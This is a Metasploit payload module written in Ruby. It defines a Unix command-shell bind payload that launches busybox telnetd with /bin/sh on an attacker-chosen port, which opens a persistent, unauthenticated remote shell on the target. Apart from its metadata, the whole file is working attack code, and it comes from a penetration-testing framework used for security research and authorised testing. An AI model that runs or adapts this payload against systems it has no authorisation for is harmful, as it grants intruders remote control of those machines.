##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Unix Command Shell, Bind TCP (busybox telnetd)',
      'Description'   => 'Listen for a connection and spawn a command shell (persistent)',
      'Author'        => 'Caleb Anderson - Context Information Security',
      'License'       => "GPL",
      'Platform'      => 'unix',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'Privileged'    => true,
      'RequiredCmd'   => 'busybox_telnetd',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
      register_options(
      [
        OptString.new('BUSYBOX_TELNETD', [ true, "Command to run busybox telnetd", "/bin/busybox telnetd"]),
        OptString.new('SHELL',           [ true, 'The system shell to use.',       '/bin/sh'])
      ], self.class)
  end

  #
  # Constructs the payload
  #
  def generate
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string

    cmd =
      "#{datastore['BUSYBOX_TELNETD']} -l #{datastore['SHELL']} -p #{datastore['LPORT']}"

    return cmd
  end

end
